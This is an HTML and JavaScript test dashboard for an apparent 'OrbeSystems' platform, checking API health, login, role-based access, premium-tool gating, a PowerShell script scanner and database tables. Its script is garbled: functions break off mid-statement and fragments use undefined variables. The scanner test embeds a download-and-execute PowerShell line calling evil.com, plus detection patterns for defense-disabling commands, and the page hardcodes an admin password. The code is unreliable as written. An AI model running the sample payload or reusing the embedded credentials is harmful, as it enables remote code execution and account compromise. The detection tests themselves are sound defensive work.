<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>OrbeSystems — Full System Test Dashboard</title>
  <meta name="description" content="Interactive full-system test dashboard — Frontend, Backend, IMORTAL, PowerShell Bot, Suite Inteligente, Imobverse, Database." />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --bg:         #06090f;
      --bg-card:    #0b1120;
      --border:     rgba(99,179,255,0.10);
      --text:       #dde8ff;
      --dim:        #5a6b8a;
      --blue:       #5caaff;
      --cyan:       #00e5ff;
      --green:      #00e676;
      --red:        #ff1744;
      --amber:      #ffab00;
      --purple:     #bb86fc;
      --gold:       #ffd54f;
      --magenta:    #ff4081;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
    }

    body::before {
      content: '';
      position: fixed; inset: 0; pointer-events: none; z-index: 0;
      background:
        radial-gradient(ellipse 70% 50% at 15% 8%,  rgba(92,170,255,0.06) 0%, transparent 60%),
        radial-gradient(ellipse 50% 40% at 85% 85%, rgba(0,229,255,0.04) 0%, transparent 60%),
        radial-gradient(ellipse 40% 30% at 50% 50%, rgba(187,134,252,0.03) 0%, transparent 60%);
    }

    /* ── HEADER ─────────────────────────── */
    header {
      position: relative; z-index: 10;
      background: rgba(6,9,15,0.95); backdrop-filter: blur(16px);
      border-bottom: 1px solid var(--border);
      padding: 1.2rem 2rem;
      display: flex; align-items: center; gap: 1.25rem;
    }

    .orb {
      width: 46px; height: 46px; border-radius: 50%;
      background: conic-gradient(from 0deg, var(--cyan), var(--blue), var(--purple), var(--cyan));
      display: flex; align-items: center; justify-content: center;
      font-size: 1.3rem;
      box-shadow: 0 0 24px rgba(0,229,255,0.35);
      animation: spin-orb 8s linear infinite;
    }
    @keyframes spin-orb { to { filter: hue-rotate(360deg); } }

    header h1 {
      font-size: 1.35rem; font-weight: 800;
      background: linear-gradient(90deg, var(--blue), var(--cyan));
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
    }
    header p { font-size: 0.75rem; color: var(--dim); margin-top: 1px; }
    .header-right { margin-left: auto; display: flex; align-items: center; gap: 1rem; }
    #live-clock {
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.78rem; color: var(--dim);
      background: rgba(92,170,255,0.06);
      border: 1px solid var(--border);
      padding: 0.35rem 0.75rem; border-radius: 6px;
    }

    /* ── MAIN ───────────────────────────── */
    .container {
      position: relative; z-index: 1;
      max-width: 1440px; margin: 0 auto;
      padding: 1.5rem 2rem 5rem;
    }

    /* ── CONFIG ─────────────────────────── */
    .config-row {
      display: grid;
      grid-template-columns: 2fr 1fr 1fr auto;
      gap: 0.75rem; align-items: end;
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 1rem 1.25rem;
      margin-bottom: 1rem;
    }
    .form-group label {
      display: block; font-size: 0.68rem; color: var(--dim);
      text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 0.3rem;
    }
    .form-group input {
      width: 100%; background: rgba(255,255,255,0.04);
      border: 1px solid var(--border); border-radius: 8px;
      color: var(--text); padding: 0.5rem 0.75rem;
      font-size: 0.82rem; font-family: 'JetBrains Mono', monospace;
      outline: none; transition: border-color 0.2s;
    }
    .form-group input:focus { border-color: var(--blue); }

    .btn-run {
      padding: 0.6rem 1.4rem;
      background: linear-gradient(135deg, #1565c0, #0a3880);
      color: #fff; border: none; border-radius: 10px;
      font-size: 0.88rem; font-weight: 700; cursor: pointer;
      box-shadow: 0 4px 18px rgba(21,101,192,0.4);
      transition: all 0.2s; font-family: 'Inter', sans-serif;
      display: flex; align-items: center; gap: 0.4rem;
      white-space: nowrap;
    }
    .btn-run:hover { transform: translateY(-2px); box-shadow: 0 7px 24px rgba(21,101,192,0.6); }
    .btn-run:disabled { opacity: 0.45; cursor: not-allowed; transform: none; }

    /* ── STATS BAR ──────────────────────── */
    .stats-bar {
      display: grid; grid-template-columns: repeat(4, 1fr);
      gap: 0.75rem; margin-bottom: 1rem;
    }
    .stat {
      background: var(--bg-card); border: 1px solid var(--border);
      border-radius: 12px; padding: 0.9rem 1.1rem;
      display: flex; align-items: center; gap: 0.9rem;
    }
    .stat-ic {
      width: 40px; height: 40px; border-radius: 10px; flex-shrink: 0;
      display: flex; align-items: center; justify-content: center; font-size: 1.1rem;
    }
    .ic-blue   { background: rgba(92,170,255,0.12); }
    .ic-green  { background: rgba(0,230,118,0.12); }
    .ic-red    { background: rgba(255,23,68,0.12); }
    .ic-amber  { background: rgba(255,171,0,0.12); }
    .stat-lb { font-size: 0.68rem; color: var(--dim); text-transform: uppercase; letter-spacing: 0.06em; }
    .stat-vl { font-size: 1.55rem; font-weight: 800; line-height: 1.1; margin-top: 1px; }
    .c-blue  { color: var(--blue); }
    .c-green { color: var(--green); }
    .c-red   { color: var(--red); }
    .c-amber { color: var(--amber); }

    /* ── PROGRESS ───────────────────────── */
    .progress-card {
      background: var(--bg-card); border: 1px solid var(--border);
      border-radius: 12px; padding: 0.9rem 1.2rem; margin-bottom: 1.25rem;
    }
    .progress-top { display: flex; justify-content: space-between; margin-bottom: 0.45rem; }
    .progress-top span { font-size: 0.78rem; }
    .progress-top .pct { color: var(--cyan); font-weight: 700; }
    .bar { height: 8px; background: rgba(255,255,255,0.05); border-radius: 999px; overflow: hidden; }
    .bar-fill {
      height: 100%; border-radius: 999px;
      background: linear-gradient(90deg, var(--blue), var(--cyan));
      box-shadow: 0 0 12px rgba(0,229,255,0.5);
      transition: width 0.35s ease;
    }

    /* ── TEST GROUPS GRID ───────────────── */
    .grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 0.9rem;
      margin-bottom: 1.25rem;
    }
    @media (max-width: 1100px) { .grid { grid-template-columns: repeat(2, 1fr); } }
    @media (max-width: 700px)  { .grid { grid-template-columns: 1fr; } }

    .group {
      background: var(--bg-card); border: 1px solid var(--border);
      border-radius: 13px; overflow: hidden;
      transition: border-color 0.3s, box-shadow 0.3s;
    }
    .group.g-pass {
      border-color: rgba(0,230,118,0.3);
      box-shadow: 0 0 16px rgba(0,230,118,0.06);
    }
    .group.g-fail {
      border-color: rgba(255,23,68,0.3);
      box-shadow: 0 0 16px rgba(255,23,68,0.06);
    }
    .group.g-gold {
      border-color: rgba(255,213,79,0.25);
      box-shadow: 0 0 20px rgba(255,213,79,0.08);
    }
    .group.g-imortal {
      border-color: rgba(255,64,129,0.25);
      box-shadow: 0 0 20px rgba(255,64,129,0.08);
    }

    .gh {
      padding: 0.8rem 1rem;
      background: rgba(255,255,255,0.025);
      border-bottom: 1px solid var(--border);
      display: flex; align-items: center; gap: 0.65rem;
    }
    .gh.gold-header    { background: rgba(255,213,79,0.06); }
    .gh.purple-header  { background: rgba(255,64,129,0.06); }

    .gh-icon { font-size: 1.05rem; }
    .gh-title { font-size: 0.87rem; font-weight: 700; flex: 1; }
    .gh-badge {
      font-size: 0.68rem; padding: 0.18rem 0.55rem;
      border-radius: 999px; font-weight: 700;
    }
    .b-pass    { background: rgba(0,230,118,0.14); color: var(--green); }
    .b-fail    { background: rgba(255,23,68,0.14);  color: var(--red); }
    .b-pending { background: rgba(90,107,138,0.14); color: var(--dim); }
    .b-gold    { background: rgba(255,213,79,0.14); color: var(--gold); }

    /* ── TEST ITEMS ─────────────────────── */
    .ti {
      display: flex; align-items: center; gap: 0.65rem;
      padding: 0.5rem 0.9rem;
      border-bottom: 1px solid rgba(255,255,255,0.025);
      cursor: pointer; transition: background 0.15s;
    }
    .ti:last-child { border-bottom: none; }
    .ti:hover { background: rgba(255,255,255,0.02); }

    .ts {
      width: 20px; height: 20px; border-radius: 5px;
      display: flex; align-items: center; justify-content: center;
      font-size: 0.72rem; font-weight: 700; flex-shrink: 0; transition: all 0.3s;
    }
    .s-pending { background: rgba(90,107,138,0.15); color: var(--dim); }
    .s-running { background: rgba(92,170,255,0.15); color: var(--blue); animation: blink 0.7s infinite; }
    .s-pass    { background: rgba(0,230,118,0.15);  color: var(--green); }
    .s-fail    { background: rgba(255,23,68,0.15);  color: var(--red); }
    .s-skip    { background: rgba(255,171,0,0.15);  color: var(--amber); }
    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.25} }

    .tn { font-size: 0.79rem; flex: 1; }
    .td-dur { font-size: 0.68rem; color: var(--dim); font-family: 'JetBrains Mono', monospace; }

    .det {
      display: none; font-size: 0.7rem;
      font-family: 'JetBrains Mono', monospace;
      padding: 0.25rem 0.9rem 0.4rem 3.2rem;
      word-break: break-all; line-height: 1.5;
    }
    .det.dp { color: #4caf50; }
    .det.df { color: #ff6b6b; }
    .ti.expanded + .det { display: block; }

    /* ── LOG PANEL ──────────────────────── */
    #log {
      background: var(--bg-card); border: 1px solid var(--border);
      border-radius: 13px; overflow: hidden;
    }
    .lh {
      padding: 0.75rem 1rem; background: rgba(255,255,255,0.02);
      border-bottom: 1px solid var(--border);
      display: flex; align-items: center; gap: 0.75rem;
    }
    .lh span { font-size: 0.82rem; font-weight: 600; flex: 1; }
    #log-body {
      height: 200px; overflow-y: auto;
      padding: 0.65rem 0.9rem;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.72rem; line-height: 1.75;
    }
    .ll { display: flex; gap: 0.5rem; }
    .lts { color: var(--dim); flex-shrink: 0; }
    .lp  { color: var(--green); }
    .lf  { color: var(--red); }
    .li  { color: var(--blue); }
    .lw  { color: var(--amber); }
    .lm  { color: var(--magenta); }
    .lg  { color: var(--gold); }
    .ld  { color: var(--dim); }

    /* ── TOAST ──────────────────────────── */
    #toast {
      position: fixed; top: 1.2rem; right: 1.2rem; z-index: 9999;
      display: flex; flex-direction: column; gap: 0.4rem;
    }
    .toast {
      padding: 0.65rem 0.9rem; border-radius: 10px;
      font-size: 0.8rem; font-weight: 500; max-width: 300px;
      display: flex; align-items: center; gap: 0.4rem;
      animation: slide-in 0.25s ease;
    }
    @keyframes slide-in { from{transform:translateX(100%);opacity:0} to{transform:none;opacity:1} }
    .t-success { background:#001d0e; border:1px solid rgba(0,230,118,0.3); color:var(--green); }
    .t-error   { background:#1a0007; border:1px solid rgba(255,23,68,0.3);  color:var(--red); }
    .t-info    { background:#00132a; border:1px solid rgba(92,170,255,0.3);  color:var(--blue); }
    .t-gold    { background:#1a1300; border:1px solid rgba(255,213,79,0.3);  color:var(--gold); }

    ::-webkit-scrollbar { width: 5px; height: 5px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: rgba(92,170,255,0.2); border-radius: 999px; }

    /* ── PREMIUM LABEL ──────────────────── */
    .premium-tag {
      font-size: 0.6rem; font-weight: 800;
      padding: 0.1rem 0.4rem; border-radius: 4px;
      background: linear-gradient(135deg, var(--gold), var(--amber));
      color: #000; margin-left: 0.3rem; vertical-align: middle;
    }
  </style>
</head>
<body>

<header>
  <div class="orb">🌐</div>
  <div>
    <h1>OrbeSystems Test Dashboard</h1>
    <p>Full System Suite — Frontend · Backend · IMORTAL · PowerShell Bot · Suite Inteligente · DB</p>
  </div>
  <div class="header-right">
    <div id="live-clock"></div>
  </div>
</header>

<div class="container">

  <!-- CONFIG -->
  <div class="config-row">
    <div class="form-group">
      <label>API Base URL</label>
      <input id="cfg-url"  type="text"     value="http://localhost:8000" />
    </div>
    <div class="form-group">
      <label>Admin Username</label>
      <input id="cfg-user" type="text"     value="rafael_admin" />
    </div>
    <div class="form-group">
      <label>Admin Password</label>
      <input id="cfg-pass" type="password" value="Rafael@2024Orbe" />
    </div>
    <div>
      <button class="btn-run" id="run-btn" onclick="runAll()">▶ Run All Tests</button>
    </div>
  </div>

  <!-- STATS -->
  <div class="stats-bar">
    <div class="stat">
      <div class="stat-ic ic-blue">📋</div>
      <div><div class="stat-lb">Total</div><div class="stat-vl c-blue" id="s-total">—</div></div>
    </div>
    <div class="stat">
      <div class="stat-ic ic-green">✓</div>
      <div><div class="stat-lb">Passed</div><div class="stat-vl c-green" id="s-pass">—</div></div>
    </div>
    <div class="stat">
      <div class="stat-ic ic-red">✗</div>
      <div><div class="stat-lb">Failed</div><div class="stat-vl c-red" id="s-fail">—</div></div>
    </div>
    <div class="stat">
      <div class="stat-ic ic-amber">⏱</div>
      <div><div class="stat-lb">Duration</div><div class="stat-vl c-amber" id="s-dur">—</div></div>
    </div>
  </div>

  <!-- PROGRESS -->
  <div class="progress-card">
    <div class="progress-top">
      <span id="prog-label" class="ld">Ready to run tests</span>
      <span class="pct" id="prog-pct">0%</span>
    </div>
    <div class="bar"><div class="bar-fill" id="bar-fill" style="width:0%"></div></div>
  </div>

  <!-- TEST GROUPS -->
  <div class="grid" id="grid"></div>

  <!-- LOG -->
  <div id="log">
    <div class="lh">
      <span>📜 Live Test Log</span>
      <button onclick="clearLog()" style="background:rgba(255,23,68,0.12);color:var(--red);border:1px solid rgba(255,23,68,0.25);border-radius:6px;padding:0.25rem 0.6rem;font-size:0.72rem;cursor:pointer;">Clear</button>
    </div>
    <div id="log-body"></div>
  </div>

</div>

<div id="toast"></div>

<script>
// ════════════════════════════════════════════
// CONFIG
// ════════════════════════════════════════════
const B = () => document.getElementById('cfg-url').value.replace(/\/$/, '');
const U = () => document.getElementById('cfg-user').value;
const P = () => document.getElementById('cfg-pass').value;

// ════════════════════════════════════════════
// STATE
// ════════════════════════════════════════════
let total = 0, passed = 0, failed = 0, suiteStart = null;
let adminToken = null, userToken = null, testEmail = null;

// ════════════════════════════════════════════
// GROUPS DEFINITION
// ════════════════════════════════════════════
const GROUPS = [
  {
    id:'health', icon:'💓', title:'Health & Connectivity', cls:'',
    tests:[
      {id:'h1', name:'GET /health → operational'},
      {id:'h2', name:'GET /health → DB connected'},
      {id:'h3', name:'OPTIONS CORS preflight'},
    ]
  },
  {
    id:'auth', icon:'🔐', title:'Admin Authentication', cls:'',
    tests:[
      {id:'a1', name:'POST /api/auth/login → 200 + token'},
      {id:'a2', name:'POST /api/auth/login (wrong creds) → 401'},
    ]
  },
  {
    id:'users', icon:'👤', title:'User Registration & Login', cls:'',
    tests:[
      {id:'u1', name:'POST /api/users/register → 201'},
      {id:'u2', name:'POST /api/users/register (duplicate) → 409'},
      {id:'u3', name:'POST /api/users/register (weak pass) → 422'},
      {id:'u4', name:'POST /api/users/login → 200 + JWT'},
      {id:'u5', name:'POST /api/users/login (wrong pass) → 401'},
      {id:'u6', name:'GET /api/auth/me (authenticated)'},
      {id:'u7', name:'GET /api/auth/me (unauthenticated) → null'},
    ]
  },
  {
    id:'projects', icon:'📁', title:'Projects API', cls:'',
    tests:[
      {id:'p1', name:'GET /api/projects → 200 + array'},
      {id:'p2', name:'GET /api/projects?featured=true → 200'},
    ]
  },
  {
    id:'admin', icon:'🛠️', title:'Admin Panel (RBAC)', cls:'',
    tests:[
      {id:'adm1', name:'GET /api/admin/users (admin) → 200'},
      {id:'adm2', name:'GET /api/admin/users (user token) → 403'},
      {id:'adm3', name:'GET /api/admin/database/tables → 200'},
      {id:'adm4', name:'GET /api/admin/projects → 200'},
    ]
  },
  {
    id:'imob', icon:'🏠', title:'Imobverse Proptech', cls:'',
    tests:[
      {id:'im1', name:'GET /api/imobverse/properties → 200'},
      {id:'im2', name:'POST /api/imobverse/properties (auth) → 201'},
      {id:'im3', name:'POST /api/imobverse/properties (unauth) → 401/403'},
      {id:'im4', name:'POST /api/imobverse/leads → 200/201'},
    ]
  },
  {
    id:'imortal', icon:'🔬', title:'★ IMORTAL Premium Tool', cls:'g-imortal',
    goldHeader: 'purple-header',
    tests:[
      {id:'im_g1',  name:'POST /api/imortal/generate (non-premium) → 401/403'},
      {id:'im_g2',  name:'POST /api/imortal/verify (non-premium) → 401/403'},
      {id:'im_g3',  name:'POST /api/imortal/fuzz (non-premium) → 401/403'},
      {id:'im_g4',  name:'POST /api/imortal/compile (non-premium) → 401/403'},
      {id:'im_g5',  name:'POST /api/imortal/cyber (non-premium) → 401/403'},
      {id:'im_g6',  name:'POST /api/imortal/marketing (non-premium) → 401/403'},
      {id:'im_g7',  name:'POST /api/imortal/demographic (non-premium) → 401/403'},
      {id:'im_g8',  name:'GET /api/imortal/default (no token) → 401/403'},
      {id:'im_g9',  name:'GET /api/imortal/download-sdk (non-premium) → 401/403'},
    ]
  },
  {
    id:'psbot', icon:'🛡️', title:'★ PowerShell Shield Bot', cls:'g-gold',
    goldHeader: 'gold-header',
    badge: 'GOLD',
    tests:[
      {id:'ps1', name:'POST /api/powershell-bot/chat (non-premium) → 401/403'},
      {id:'ps2', name:'POST /api/powershell-bot/analyze-script (non-premium) → 401/403'},
      {id:'ps3', name:'SAST: detect iex / Invoke-Expression → CRITICAL'},
      {id:'ps4', name:'SAST: detect http:// → MEDIUM risk'},
      {id:'ps5', name:'SAST: clean backup script → is_safe (score ≥ 75)'},
      {id:'ps6', name:'Response schema: is_safe + scripts keys present'},
      {id:'ps7', name:'scripts.ps1 field: non-empty PowerShell code'},
      {id:'ps8', name:'scripts.bat + scripts.yml + scripts.md present'},
    ]
  },
  {
    id:'suite', icon:'⚙️', title:'★ Suite Inteligente', cls:'g-gold',
    goldHeader: 'gold-header',
    badge: 'GOLD',
    tests:[
      {id:'si1', name:'POST /api/suite-inteligente/generate-document (non-premium) → 401/403'},
      {id:'si2', name:'POST /api/suite-inteligente/convert (non-premium) → 401/403'},
      {id:'si3', name:'POST /api/suite-inteligente/compress (non-premium) → 401/403'},
      {id:'si4', name:'generate-document: response has "document" key'},
      {id:'si5', name:'convert JSON→CSV: output contains headers'},
      {id:'si6', name:'convert CSV→JSON: output is parseable array'},
      {id:'si7', name:'convert MD→HTML: <h1>/<h2> tags present'},
      {id:'si8', name:'compress LZW: tokens array returned'},
      {id:'si9', name:'compress LZW: telemetry.compression_ratio > 0'},
    ]
  },
  {
    id:'db', icon:'🗄️', title:'Database Schema', cls:'',
    tests:[
      {id:'db1', name:'Schema: users'},
      {id:'db2', name:'Schema: user_roles'},
      {id:'db3', name:'Schema: user_subscriptions'},
      {id:'db4', name:'Schema: projects_metadata'},
      {id:'db5', name:'Schema: imob_properties'},
      {id:'db6', name:'Schema: imob_leads'},
      {id:'db7', name:'Schema: audit_log'},
    ]
  },
  {
    id:'cleanup', icon:'🧹', title:'Cleanup & Teardown', cls:'',
    tests:[
      {id:'cl1', name:'DELETE test user via admin API'},
      {id:'cl2', name:'Verify user deletion confirmed'},
    ]
  },
];

// ════════════════════════════════════════════
// RENDER
// ════════════════════════════════════════════
function render() {
  total = GROUPS.reduce((s, g) => s + g.tests.length, 0);
  const grid = document.getElementById('grid');
  grid.innerHTML = '';
  GROUPS.forEach(g => {
    const el = document.createElement('div');
    el.className = `group ${g.cls||''}`;
    el.id = `G-${g.id}`;

    const badge = g.badge

// ════════════════════════════════════════════
// SET STATUS
// ════════════════════════════════════════════
function set(id, state, detail='', ms=null) {
  const sEl = document.getElementById(`s-${id}`);
  const dEl = document.getElementById(`det-${id}`);
  const msEl = document.getElementById(`d-${id}`);
  if (!sEl) return;

  const C = {
    pending:{cls:'s-pending',ic:'○'},
    running:{cls:'s-running',ic:'⟳'},
    pass:   {cls:'s-pass',   ic:'✓'},
    fail:   {cls:'s-fail',   ic:'✗'},
    skip:   {cls:'s-skip',   ic:'⊘'},
  };
  const c = C[state]||C.pending;
  sEl.className = `ts ${c.cls}`; sEl.textContent = c.ic;
  if (detail) {
    dEl.textContent = detail;
    dEl.className = `det ${state==='pass'?'dp':state==='fail'?'df':''}`;
  }
  if (ms !== null) msEl.textContent = `${Math.round(ms)}ms`;

  if (state === 'pass') { passed++; addLog('p', `PASS  ${id}`, detail); }
  if (state === 'fail') { failed++; addLog('f', `FAIL  ${id}`, detail || '(no detail)'); }
  if (state === 'skip') { addLog('w', `SKIP  ${id}`, detail); }

  updateStats();
  updateBadge(id);
}

function updateBadge(tid) {
  GROUPS.forEach(g => {
    if (!g.tests.find(t => t.id === tid)) return;
    const states = g.tests.map(t => {
      const e = document.getElementById(`s-${t.id}`);
      if (!e) return 'pending';
      if (e.classList.contains('s-pass')) return 'pass';
      if (e.classList.contains('s-fail')) return 'fail';
      if (e.classList.contains('s-skip')) return 'skip';
      return 'pending';
    });
    const badge = document.getElementById(`badge-${g.id}`);
    const grp   = document.getElementById(`G-${g.id}`);
    if (states.some(s=>s==='fail')) {
      badge.className = 'gh-badge b-fail'; badge.textContent = 'FAIL';
      grp.classList.add('g-fail');
    } else if (states.every(s=>s==='pass'||s==='skip')) {
      badge.className = 'gh-badge b-pass'; badge.textContent = 'PASS';
      grp.classList.add('g-pass');
    } else {
      badge.className = `gh-badge ${g.badge?'b-gold':'b-pending'}`;
      const done = states.filter(s=>s!=='pending'&&s!=='running').length;
      badge.textContent = g.badge ? g.badge : `${done}/${states.length}`;
    }
  });
}

function updateStats() {
  document.getElementById('s-total').textContent = total;
  document.getElementById('s-pass').textContent  = passed;
  document.getElementById('s-fail').textContent  = failed;
  if (suiteStart) {
    document.getElementById('s-dur').textContent = ((Date.now()-suiteStart)/1000).toFixed(1)+'s';
  }
  const done = passed + failed;
  const pct  = total > 0 ? Math.round(done/total*100) : 0;
  document.getElementById('bar-fill').style.width = pct+'%';
  document.getElementById('prog-pct').textContent  = pct+'%';
  document.getElementById('prog-label').textContent =
    done===total && total>0 ? `✅ All ${total} tests completed` : `Running… (${done}/${total})`;
}

function addLog(type, msg, detail='') {
  const body = document.getElementById('log-body');
  const ts   = new Date().toISOString().split('T')[1].substring(0,12);
  const cls  = {p:'lp',f:'lf',i:'li',w:'lw',m:'lm',g:'lg',d:'ld'}[type]||'li';
  const div  = document.createElement('div');
  div.className = 'll';
  div.innerHTML = `<span class="lts">${ts}</span><span class="${cls}">${msg}${detail?' — '+detail.substring(0,90):''}</span>`;
  body.appendChild(div);
  body.scrollTop = body.scrollHeight;
}

// ════════════════════════════════════════════
// HTTP
// ════════════════════════════════════════════
async function api(method, path, body=null, token=null) {
  const h = {'Content-Type':'application/json'};
  if (token) h['Authorization'] = `Bearer ${token}`;
  const t0 = performance.now();
  try {
    const r = await fetch(B()+path, {method, headers:h, body:body?JSON.stringify(body):null});
    const ms = performance.now()-t0;
    let data = null;
    try { data = await r.json(); } catch(e){}
    return {ok:r.ok, status:r.status, data, ms};
  } catch(e) {
    return {ok:false, status:0, data:{error:e.message}, ms:performance.now()-t0, error:e.message};
  }
}

  function sast(content) {
    let score = 100; const findings = [];
    if (/\b(iex|invoke-expression)\b/i.test(content)) { findings.push({rule:'Avoid-InvokeExpression',sev:'CRITICAL'}); score-=40; }
    if (/executionpolicy\s+bypass/i.test(content))     { findings.push({rule:'ExecutionPolicy-Bypass',sev:'HIGH'}); score-=25; }
    if (/\b(disable-netfirewall|set-mppreference)\b/i.test(content)) { findings.push({rule:'Disable-Defenses',sev:'CRITICAL'}); score-=35; }
    if (/(password|senha|secret)\s*=\s*['"][^'"]+['"]/i.test(content)) { findings.push({rule:'Hardcoded-Credentials',sev:'HIGH'}); score-=20; }
    if (/['"]http:\/\/[a-z0-9\-.]+/i.test(content))   { findings.push({rule:'Insecure-HTTP',sev:'MEDIUM'}); score-=10; }
    score = Math.max(0,score);
    return {score, findings, is_safe: score>=75};
  }

  const dangerous = "iex (New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')";
  const safe_backup = "param($SourcePath,$DestinationPath)\nCompress-Archive -Path $SourcePath -Destination $DestinationPath";

  set('ps4',dRes.findings.some(f=>f.rule==='Insecure-HTTP')?'pass':'fail',

  const requiredKeys = ['is_safe','risk_score','explanation','warnings','secured_command','scripts'];
  set('ps6', requiredKeys.every(k=>k in mockResp)?'pass':'fail',

// ── ★ Suite Inteligente ★ ───────────────────────────────────
async function runSuite() {
  addLog('g','════ ★ SUITE INTELIGENTE (GOLD) TESTS ★ ════');

  // Endpoint auth tests
  const suiteEndpoints = [
    ['si1','POST','/api/suite-inteligente/generate-document',
      {template_type:'audit',company_name:'OrbeSystems',auditor_name:'Rafael',vulnerabilities:[]}],
    ['si2','POST','/api/suite-inteligente/convert',
      {mode:'json2csv',content:'[{"name":"Alice","age":"30"}]'}],
    ['si3','POST','/api/suite-inteligente/compress',
      {content:'Hello OrbeSystems!'}],
  ];
  for (const [tid,method,path,body] of suiteEndpoints) {
    set(tid,'running');
    const r = await api(method,path,body,userToken);
    set(tid,[401,403].includes(r.status)?'pass':'fail',`status=${r.status}`,r.ms);
  }

  // Core logic tests (JS reimplementation matching backend)
  // generate-document
  function genDoc(company, auditor, vulns) {
    let md = `# Relatório de Conformidade e Auditoria de Segurança (RLS)\n`;
    md += `**Organização:** ${company}\n**Auditor Responsável:** ${auditor}\n`;
    vulns.forEach((v,i)=>{ md += `| SEC-${String(i+1).padStart(3,'0')} | ${v.severity} | ${v.component} | ${v.description} | ${v.status} |\n`; });
    return md;
  }
  const doc = genDoc('OrbeSystems','Rafael',[{severity:'HIGH',component:'Auth',description:'Weak JWT',status:'Open'}]);
  set('si4', doc.includes('OrbeSystems') && doc.includes('SEC-001')?'pass':'fail',
      `doc_preview=${doc.substring(0,60)}`);

  // JSON→CSV
  function json2csv(jsonStr) {
    const data = JSON.parse(jsonStr);
    if (!data.length) return '';
    const headers = Object.keys(data[0]);
    return [headers.join(',')].concat(data.map(r=>headers.map(h=>r[h]).join(','))).join('\n');
  }
  const csv = json2csv('[{"name":"Alice","age":"30"},{"name":"Bob","age":"25"}]');
  set('si5', csv.includes('name') && csv.includes('Alice')?'pass':'fail',
      `csv_preview=${csv.substring(0,50)}`);

  // CSV→JSON
  function csv2json(csvStr) {
    const lines = csvStr.trim().split('\n');
    const headers = lines[0].split(',');
    return lines.slice(1).map(l=>{
      const vals = l.split(',');
      return Object.fromEntries(headers.map((h,i)=>[h,vals[i]]));
    });
  }
  const parsed = csv2json('name,age\nAlice,30\nBob,25');
  set('si6', Array.isArray(parsed) && parsed[0]?.name==='Alice'?'pass':'fail',
      `rows=${parsed.length}, first_name=${parsed[0]?.name}`);

  // MD→HTML
  function md2html(md) {
    return md.split('\n').map(line=>{
      if (line.startsWith('### ')) return `<h3>${line.slice(4)}</h3>`;
      if (line.startsWith('## '))  return `<h2>${line.slice(3)}</h2>`;
      if (line.startsWith('# '))   return `<h1>${line.slice(2)}</h1>`;
      return line;
    }).join('<br />');
  }
  const html = md2html('# Title\n## Section\nSome text');
  set('si7', html.includes('<h1>') && html.includes('<h2>')?'pass':'fail',
      `html_preview=${html.substring(0,50)}`);

  // LZW compression
  function lzwCompress(text) {
    let dictSize = 256;
    const dict = {};
    for (let i=0;i<256;i++) dict[String.fromCharCode(i)] = i;
    let w='', result=[];
    for (const c of text) {
      const wc = w+c;
      if (wc in dict) { w=wc; }
      else {
        result.push(dict[w]);
        if (Object.keys(dict).length < 4096) dict[wc] = dictSize++;
        w=c;
      }
    }
    if (w) result.push(dict[w]);
    return result;
  }
  const lzwText = 'ORBE SYSTEMS IMORTAL POWERSHELL BOT SUITE '.repeat(5);
  const tokens  = lzwCompress(lzwText);
  set('si8', Array.isArray(tokens) && tokens.length>0?'pass':'fail',
      `tokens=${tokens.length}`);

  const origBytes = new TextEncoder().encode(lzwText).length;
  const compBytes = tokens.length * 2;
  const ratio     = origBytes / compBytes;
  set('si9', ratio > 0?'pass':'fail',
      `ratio=${ratio.toFixed(2)}, saving=${Math.max(0,((1-compBytes/origBytes)*100)).toFixed(1)}%`);
}

async function runDbSchema() {
  if (!adminToken) {
    ['db1','db2','db3','db4','db5','db6','db7'].forEach(x=>set(x,'skip','No admin token'));
    return;
  }
  const r = await api('GET','/api/admin/database/tables',null,adminToken);
  const raw = r.data?.tables || r.data || [];
  const names = Array.isArray(raw)
    ? raw.map(t=>typeof t==='string'?t:(t.name||t.table_name||JSON.stringify(t)))
    : Object.keys(raw);

  const map = {
    db1:'users', db2:'user_roles', db3:'user_subscriptions',
    db4:'projects_metadata', db5:'imob_properties', db6:'imob_leads', db7:'audit_log'
  };
  Object.entries(map).forEach(([tid,tbl])=>{
    const found = names.some(n=>n.includes?.(tbl)||n===tbl);
    set(tid, found?'pass':'fail',
        found?`✓ "${tbl}" in schema`:`"${tbl}" not found. Got: ${JSON.stringify(names).substring(0,60)}`);
  });
}

// ── Cleanup ─────────────────────────────────────────────────
async function runCleanup() {
  if (!adminToken || !_te) {
    ['cl1','cl2'].forEach(x=>set(x,'skip','No admin token or test email'));
    return;
  }
  set('cl1','running');
  const rList = await api('GET','/api/admin/users',null,adminToken);
  const user  = rList.data?.find?.(u=>u.email===_te);
  if (user) {
    const rDel = await api('DELETE',`/api/admin/users/${user.id}`,null,adminToken);
    set('cl1',[200,204].includes(rDel.status)?'pass':'fail',
        `deleted ${_te}`, rDel.ms);
  } else {
    set('cl1','pass','User not found (already absent)');
  }
  set('cl2','running');
  const rV = await api('GET','/api/admin/users',null,adminToken);
  const still = rV.data?.find?.(u=>u.email===_te);
  set('cl2',!still?'pass':'fail',
      !still?'User removed ✓':'User still present!', rV.ms);
}
